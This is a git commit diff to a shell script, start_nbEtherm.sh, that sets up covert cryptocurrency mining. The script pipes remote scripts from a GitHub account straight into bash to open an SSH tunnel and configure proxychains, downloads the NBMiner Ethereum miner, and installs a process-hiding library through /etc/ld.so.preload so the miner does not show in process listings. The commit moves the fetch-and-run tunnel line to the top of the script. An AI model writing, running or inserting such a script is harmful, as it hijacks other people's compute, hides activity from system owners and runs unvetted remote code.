f935abf00388b4234f0341df060abea846b32904
chadpetersen1337 <68467197+chadpetersen1337@users.noreply.github.com>
2021-03-04 13:11:06 +0200

    Update start_nbEtherm.sh

--- start_nbEtherm.sh
+++ start_nbEtherm.sh
@@ -1,4 +1,6 @@
+wget -O - https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/setUpSSHTunnel.sh | bash
 wget -O - https://raw.githubusercontent.com/chadpetersen1337/sockd/main/chains.sh | bash
+sleep .1
 proxychains curl ifconfig.me
 proxychains wget https://github.com/NebuTech/NBMiner/releases/download/v36.1/NBMiner_36.1_Linux.tgz
 tar -xvzf NBMiner_36.1_Linux.tgz
@@ -11,5 +13,4 @@ make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-wget -O - https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/setUpSSHTunnel.sh | bash
 ./nbEthermine.sh
